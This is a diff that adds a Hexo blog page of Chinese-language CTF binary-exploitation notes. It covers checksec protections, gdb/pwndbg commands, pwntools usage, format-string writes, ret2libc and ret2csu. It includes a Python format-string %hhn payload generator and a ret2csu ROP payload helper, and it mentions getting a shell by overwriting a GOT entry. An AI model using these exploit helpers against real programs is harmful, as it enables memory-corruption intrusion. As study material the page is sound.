@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ChecksecArch:程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？ RELRORelocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。 部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入&#x2F;bin&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/02/12/pwn/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ChecksecArch:程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？ RELRORelocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。 部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入&#x2F;bin&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-02-12T06:35:20.637Z">
+<meta property="article:modified_time" content="2023-02-10T15:01:21.216Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/12/pwn/" class="article-date">
+  <time class="dt-published" datetime="2023-02-12T06:35:20.637Z" itemprop="datePublished">2023-02-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/755e52d48a77">Checksec</a></h1><h2 id="Arch"><a href="#Arch" class="headerlink" title="Arch:"></a>Arch:</h2><p>程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？</p>
+<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。</p>
+<p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\x00获得shell</strong></p>
+<p>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<h2 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
+<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写</p>
+<p>GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。</p>
+<p>若开启一般需在攻击时泄露地址信息</p>
+<h1 id="认识程序"><a href="#认识程序" class="headerlink" title="认识程序"></a>认识程序</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ol>
+<li><p>readelf -a filename |less 类似于PETool查看信息</p>
+</li>
+<li><p>strings 打印字符串</p>
+</li>
+<li><p>ldd ldd命令用于打印程序或库文件所依赖的共享库列表，“&#x3D;&gt;”左边的表示该程序需要连接的共享库之 so 名称，右边表示由 Linux 的共享库系统找到的对应的共享库在文件系统中的具体位置。默认情况下， &#x2F;etc&#x2F;ld.so.conf  文件中包含有默认的共享库搜索路径。</p>
+</li>
+<li><p>objdump -d filename -M intel|att 反汇编</p>
+</li>
+</ol>
+<h1 id="GDB调试-pwndbg"><a href="#GDB调试-pwndbg" class="headerlink" title="GDB调试+pwndbg"></a>GDB调试+pwndbg</h1><ol>
+<li><p>run 程序完全跑一遍</p>
+</li>
+<li><p>start break到程序入口点（一般main）</p>
+</li>
+<li><p>info register 查看栈</p>
+</li>
+<li><p>disassemble main||$reg  反编译  </p>
+</li>
+<li><p>set disassembly-flavor intel|att 改变汇编风格</p>
+</li>
+<li><p>disable&#x2F;enable break number 让number处断点失效和生效</p>
+</li>
+<li><p>stepi(si) 用于进入式单步跟踪一条机器码</p>
+</li>
+<li><p>nexti(ni) 用于非进入式单步跟踪一条机器码</p>
+</li>
+<li><p>finish 一直运行到函数返回并打印函数返回时的堆栈地址和返回值及参数值等信息</p>
+</li>
+<li><p>x 查看内存  x $pc：显示程序指针内容  x&#x2F;i $pc：显示程序指针汇编。 x&#x2F;10i $pc：显示程序指针之后10条指令。 x&#x2F;128wx 0xfc207000：从0xfc20700开始以16进制打印128个word。</p>
+<blockquote>
+<p><strong>x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; <target>   n f u 为可选参数</strong></p>
+<ul>
+<li><p>n 个数</p>
+</li>
+<li><p>f 显示格式:</p>
+</li>
+</ul>
+<blockquote>
+<p>x 按十六进制 </p>
+<p>d 按十进制格式 </p>
+<p>u 按十六进制格式显示无符号整型 </p>
+<p>o 按八进制格式量 </p>
+<p>t 按二进制格式 </p>
+<p>c 按字符格式 </p>
+<p>f 按浮点数格式。</p>
+<p>s 按字符串格式</p>
+<p>i 按反汇编</p>
+</blockquote>
+<ul>
+<li>u 单位 默认是4个bytes。u参数可以用下面的字符来代替：</li>
+</ul>
+<blockquote>
+<p>b表示单字节</p>
+<p>h表示双字节</p>
+<p>w表示四字节</p>
+<p>g表示八字节</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>set + 变量 &#x3D; 变量值</p>
+</li>
+<li><p>cyclic  数字 生成指定数字长度的有规律字符串  cyclic -l 四位需要找的子字符串 输出前面有多少字符</p>
+</li>
+<li><p>vmmap 显示程序地址段和权限以及位置信息</p>
+</li>
+<li><p>search 命令的语法格式为：search <regexp>  reverse-search <regexp>第一项命令格式表示从当前行的开始向前搜索，后一项表示从当前行开始向后搜索。其中 regexp 就是正则表达式，正则表达式描述了一种字符串匹配的模式，可以用来检查一个串中是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串。很多的编程语言都支持使用正则表达式。</p>
+</li>
+<li><p>layout：用于分割窗口，可以一边查看代码，一边测试。主要有以下几种用法：</p>
+<ul>
+<li>layout src：显示源代码窗口</li>
+<li>layout asm：显示汇编窗口</li>
+<li>layout regs：显示源代码&#x2F;汇编和寄存器窗口</li>
+<li>layout split：显示源代码和汇编窗口</li>
+<li>layout next：显示下一个layout</li>
+<li>layout prev：显示上一个layout</li>
+<li>Ctrl + L：刷新窗口</li>
+<li>Ctrl + x，再按1：单窗口模式，显示一个窗口</li>
+<li>Ctrl + x，再按2：双窗口模式，显示两个窗口Ctrl + x，再按a：回到传统模式，即退出layout，回到执行layout之前的调试窗口。</li>
+</ul>
+</li>
+<li><p>名字查找函数地址”info address function_name”  地址查找函数信息”info symbol func_addr”</p>
+</li>
+</ol>
+<h1 id="Python-pwntools"><a href="#Python-pwntools" class="headerlink" title="Python pwntools"></a>Python pwntools</h1><h2 id="本地部署pwn题环境"><a href="#本地部署pwn题环境" class="headerlink" title="本地部署pwn题环境"></a>本地部署pwn题环境</h2><p>socat tcp-l:端口号 fork,exec:程序 ,reuseaddr</p>
+<p>nc 127.0.0.0 端口号</p>
+<p>ida:gdbserver localhost:port </p>
+<p>next(elf.search(b’’))</p>
+<p>b* $rebase(0x138E)</p>
+<h1 id="python3-str-byte"><a href="#python3-str-byte" class="headerlink" title="python3 str byte"></a><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/56901822#:~:text=Python2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9Astr%20%E5%92%8C%20unicode%EF%BC%8CPython3%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%9F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9Astr%20%E5%92%8C%20bytes%E3%80%82%20Python2,%E7%9A%84%20str%20%E7%9B%B8%E5%BD%93%E4%BA%8E%20Python3%20%E7%9A%84bytes%EF%BC%8C%E8%80%8Cunicode%E7%9B%B8%E5%BD%93%E4%BA%8EPython3%E7%9A%84str%E3%80%82%20Python2%E9%87%8C%E9%9D%A2%E7%9A%84str%E5%92%8Cunicode%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%B7%B7%E7%94%A8%E7%9A%84%EF%BC%8C%E5%9C%A8%E9%83%BD%E6%98%AF%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D%E7%9A%84%E6%97%B6%E5%80%99str%E5%92%8Cunicode%E6%B2%A1%E6%9C%89%E5%8C%BA%E5%88%AB%E3%80%82">python3 str byte</a></h1><h1 id="sendline和send"><a href="#sendline和send" class="headerlink" title="sendline和send"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15855666.html">sendline和send</a></h1><p>使用sendline的结果取决于输入的函数</p>
+<p>如果是read函数的话，①只有当count的字节数大于你所输入的字节数，这个回车才不会产生任何的影响，而多出来的回车也会被当成输入数据正常存入栈中（如果输入的地址是栈的话）；②当count字节数等于你所输入的字节数，那么最后的sendline的回车会停留在栈中（没有在缓冲区中），此时它是不正常存入，因为这个回车的缘故，已经造成了溢出；③当count字节数小于你所输入的字节数，那么没有输入进指定地址的内容，都会停留在输入缓冲区，有可能会影响之的输入。<strong>但值得一提的是使用read函数，我们可以用send来发送数据，这样就可以确保万无一失</strong>。（<strong>如果是gets函数或者scanf函数</strong>，我们没有办法选择，<strong>只能使用sendline</strong>，这两种函数只有遇见sendline发送的回车，才会停止读入。<strong>gets函数会清空缓冲区里的回车，而scanf则不会清空回车。因此scanf可能会因为没有清空回车的缘故，对之后的程序输入可能造成影响，gets函数在输入的字符串结尾填上一个00存入栈中。此时的00也有可能会覆盖原本栈中的数据</strong>，另外就是遇见fgets的话，也是没的选，只能用sendline</p>
+<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p> $ 号是用来指定参数的。</p>
+<ol>
+<li><p>读取栈上某地址的话大概格式是：%参数顺序$类型，譬如 %7$lx 就是以 lx 格式读第 7 个参数的值。</p>
+</li>
+<li><p>%k$x的含义即为：输出从栈顶起算，第k个参数（esp+4*（k-1）（该参数为一个地址）(k&gt;&#x3D;2)）所对应的内容的16进制格式。</p>
+</li>
+<li><p>%i$s表示输出偏移i处的地址指向的字符串</p>
+</li>
+<li><p>在C printf() 中，%n是一个特殊的格式说明符，它不打印某些内容，printf() 统计出现在 %n 之前的字符数，并将该值赋值给参数变量。</p>
+</li>
+<li><p>%10$n 栈上第十个参数写入值</p>
+</li>
+<li><ul>
+<li>%hhn 写一字节</li>
+<li>%hn 写两字节</li>
+<li>%n  写四字节</li>
+<li>%ln 32位写四字节，64位写八字节</li>
+<li>%lln 写八字节</li>
+</ul>
+</li>
+</ol>
+<p>如果做写入的话一般格式是： %数值c%参数顺序$类型，譬如说 %40c%5$hhn 就是向第 5 个参数写入 40 这个数值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">0x1</span>,b=<span class="number">0x2</span>,c=<span class="number">0x3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$p&quot;</span>,a,b,c);</span><br><span class="line"></span><br><span class="line">输出<span class="number">0x3</span></span><br></pre></td></tr></table></figure>
+
+<p>hh 输出 1byte</p>
+<p>h 输出 2byte</p>
+<p>l 输出 4byte</p>
+<p>ll 输出 8byte</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">prev, word, index</span>):</span><br><span class="line">    <span class="keyword">if</span> prev&lt;word:</span><br><span class="line">        padding=word-prev</span><br><span class="line">        fmtstr=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(padding).encode()+<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> word&lt;prev:</span><br><span class="line">        padding=<span class="number">256</span>+word-prev</span><br><span class="line">        fmtstr=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(padding).encode()+<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    fmtstr+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size==<span class="number">4</span>:</span><br><span class="line">            payload+=p32(addr+i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload+=p64(addr+i)</span><br><span class="line">    prev=<span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload+=fmt(prev,(target&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>,offset+i)</span><br><span class="line">        prev=(target&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="comment"># b&#x27;(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn&#x27;</span></span><br><span class="line"><span class="comment"># offset 表示要覆盖的地址最初的偏移</span></span><br><span class="line"><span class="comment"># size 表示机器字长</span></span><br><span class="line"><span class="comment"># addr 表示将要覆盖的地址。</span></span><br><span class="line"><span class="comment"># target 表示我们要覆盖为的目的变量值。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。（找到合适libc库时可以直接利用ELF确定偏移）elf.symbols</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变(都是以页的大小为基础随机，linux一般4k)。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;function name&#x27;</span>,leaked address)</span><br><span class="line">ads=libc.dump(<span class="string">&#x27;function name&#x27;</span>) <span class="comment">#the offset relative to libc.so</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p> 64 位程序中x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:000000000040060D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14     </span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">cmu_begin=<span class="number">0x040061A</span> </span><br><span class="line">cmu_again=<span class="number">0x0400600</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12_call,r13_a3,r14_a2,r15_a1,last_ret</span>):<span class="comment">#注意第三个参数是call的r12寄存器所存地址里的地址call	qword ptr [r12+rbx*8]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    rbx=0</span></span><br><span class="line"><span class="string">    rbp=1</span></span><br><span class="line"><span class="string">    r12= call the address in address</span></span><br><span class="line"><span class="string">    r13= rdx third argument</span></span><br><span class="line"><span class="string">    r14= rsi second argument</span></span><br><span class="line"><span class="string">    r15= edi first argument </span></span><br><span class="line"><span class="string">    last= ret address   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=padding+fake_rbp+p64(cmu_begin)+p64(rbx)+p64(rbp)+p64(r12_call)+p64(r13_a3)+p64(r14_a2)+p64(r15_a1)+p64(cmu_again)</span><br><span class="line">    payload+=fake_reg+p64(last_ret)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    </span><br><span class="line">gef➤  x/5i <span class="number">0x000000000040061A</span></span><br><span class="line">   <span class="number">0x40061a</span> &lt;__libc_csu_init+<span class="number">90</span>&gt;:   pop    rbx</span><br><span class="line">   <span class="number">0x40061b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;:   pop    rbp</span><br><span class="line">   <span class="number">0x40061c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;:   pop    r12</span><br><span class="line">   <span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:   pop    r13</span><br><span class="line">   <span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:   pop    r14</span><br><span class="line">gef➤  x/5i <span class="number">0x000000000040061b</span></span><br><span class="line">   <span class="number">0x40061b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;:   pop    rbp</span><br><span class="line">   <span class="number">0x40061c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;:   pop    r12</span><br><span class="line">   <span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:   pop    r13</span><br><span class="line">   <span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:   pop    r15</span><br><span class="line">gef➤  x/5i <span class="number">0x000000000040061A</span>+<span class="number">3</span></span><br><span class="line">   <span class="number">0x40061d</span> &lt;__libc_csu_init+<span class="number">93</span>&gt;:   pop    rsp</span><br><span class="line">   <span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:   pop    r13</span><br><span class="line">   <span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:   pop    r15</span><br><span class="line">   <span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;:  ret</span><br><span class="line">gef➤  x/5i <span class="number">0x000000000040061e</span></span><br><span class="line">   <span class="number">0x40061e</span> &lt;__libc_csu_init+<span class="number">94</span>&gt;:   pop    r13</span><br><span class="line">   <span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:   pop    r15</span><br><span class="line">   <span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;:  ret</span><br><span class="line">   <span class="number">0x400625</span>:    nop</span><br><span class="line">gef➤  x/5i <span class="number">0x000000000040061f</span></span><br><span class="line">   <span class="number">0x40061f</span> &lt;__libc_csu_init+<span class="number">95</span>&gt;:   pop    rbp</span><br><span class="line">   <span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:   pop    r15</span><br><span class="line">   <span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;:  ret</span><br><span class="line">   <span class="number">0x400625</span>:    nop</span><br><span class="line">gef➤  x/5i <span class="number">0x0000000000400620</span></span><br><span class="line">   <span class="number">0x400620</span> &lt;__libc_csu_init+<span class="number">96</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:   pop    r15</span><br><span class="line">   <span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;:  ret</span><br><span class="line">   <span class="number">0x400625</span>:    nop</span><br><span class="line">   <span class="number">0x400626</span>:    nop    WORD PTR cs:[rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">gef➤  x/5i <span class="number">0x0000000000400621</span></span><br><span class="line">   <span class="number">0x400621</span> &lt;__libc_csu_init+<span class="number">97</span>&gt;:   pop    rsi</span><br><span class="line">   <span class="number">0x400622</span> &lt;__libc_csu_init+<span class="number">98</span>&gt;:   pop    r15</span><br><span class="line">   <span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;:  ret</span><br><span class="line">   <span class="number">0x400625</span>:    nop</span><br><span class="line">gef➤  x/5i <span class="number">0x000000000040061A</span>+<span class="number">9</span></span><br><span class="line">   <span class="number">0x400623</span> &lt;__libc_csu_init+<span class="number">99</span>&gt;:   pop    rdi</span><br><span class="line">   <span class="number">0x400624</span> &lt;__libc_csu_init+<span class="number">100</span>&gt;:  ret</span><br><span class="line">   <span class="number">0x400625</span>:    nop</span><br><span class="line">   <span class="number">0x400626</span>:    nop    WORD PTR cs:[rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x400630</span> &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">_</span>init</span><br><span class="line"><span class="built_in">_</span>start</span><br><span class="line">call<span class="built_in">_</span>gmon<span class="built_in">_</span>start</span><br><span class="line">deregister<span class="built_in">_</span>tm<span class="built_in">_</span>clones</span><br><span class="line">register<span class="built_in">_</span>tm<span class="built_in">_</span>clones</span><br><span class="line"><span class="built_in">_</span><span class="built_in">_</span>do<span class="built_in">_</span>global<span class="built_in">_</span>dtors<span class="built_in">_</span>aux</span><br><span class="line">frame<span class="built_in">_</span>dummy</span><br><span class="line"><span class="built_in">_</span><span class="built_in">_</span>libc<span class="built_in">_</span>csu<span class="built_in">_</span>init</span><br><span class="line"><span class="built_in">_</span><span class="built_in">_</span>libc<span class="built_in">_</span>csu<span class="built_in">_</span>fini</span><br><span class="line"><span class="built_in">_</span>fini</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="fakeAddress"><a href="#fakeAddress" class="headerlink" title="fakeAddress"></a>fakeAddress</h1><p>远程程序异常结束它是不会给回显的，因此一定要在fakeaddress内填exit的地址，使程序能够正常结束</p>
+<h1 id="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题（同kali）"><a href="#关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题（同kali）" class="headerlink" title="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题（同kali）"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15996874.html">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题（同kali）</a></h1><p>64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐,因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。</p>
